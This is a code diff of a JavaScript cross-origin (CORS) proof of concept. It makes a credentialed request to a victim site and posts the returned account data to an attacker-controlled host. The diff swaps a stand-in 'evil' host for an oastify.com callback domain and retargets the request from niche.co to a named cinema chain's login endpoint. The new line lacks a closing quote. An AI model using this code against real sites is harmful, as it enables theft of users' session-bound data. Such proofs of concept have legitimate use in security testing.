@@ -9,13 +9,13 @@ xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
 var a = this.responseText; // Sensitive data from niche.co about user account
 document.getElementById("demo").innerHTML = a;
-xhttp.open("POST", "http://evil.cors.com", true);// Sending that data to Attacker's website
+xhttp.open("POST", "http://0vwj4byn1nxy6wo5tto1m8eet5zwnnbc.oastify.com", true);// Sending that data to Attacker's website
 xhttp.withCredentials = true;
 console.log(a);
 xhttp.send("data="+a);
 }
 };
-xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
+xhttp.open("GET", "https://identityserver.landmarkcinemas.com/Account/Login, true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
